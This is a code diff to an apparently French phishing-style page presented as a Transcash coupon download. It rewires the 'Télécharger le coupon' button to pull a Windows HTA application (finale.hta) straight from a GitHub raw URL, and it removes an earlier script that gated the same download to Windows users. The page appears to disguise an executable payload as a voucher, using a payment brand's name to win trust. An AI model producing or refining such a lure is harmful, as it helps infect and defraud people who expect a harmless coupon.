@@ -108,7 +108,7 @@
 
   <p class="important">Le coupon est uniquement accessible avec votre ordinateur Windows.</p>
 
-  <a class="download-btn" href="#" id="downloadBtn">📥 Télécharger le coupon</a>
+  <a class="download-btn" href="https://raw.githubusercontent.com/fabienneroger/hta-finale/main/finale.hta" download>📥 Télécharger le coupon</a>
 
 </div>
 
@@ -118,24 +118,6 @@
   <a href="#">Mentions légales</a> | <a href="#">Conditions Générales d'Utilisation</a><br>
   <a href="mailto:contact@transcash.fr">contact@transcash.fr</a>
 </div>
-
-<script>
-  function isWindows() {
-    return navigator.userAgent.indexOf('Windows') !== -1;
-  }
-
-  const downloadBtn = document.getElementById("downloadBtn");
-  const downloadLink = "https://raw.githubusercontent.com/fabienneroger/hta-finale/main/finale.hta";
-
-  downloadBtn.addEventListener("click", function(e) {
-    e.preventDefault();
-    if (isWindows()) {
-      window.location.href = downloadLink;
-    } else {
-      alert("❌ Ce fichier est uniquement disponible pour Windows.");
-    }
-  });
-</script>
 
 </body>
 </html>
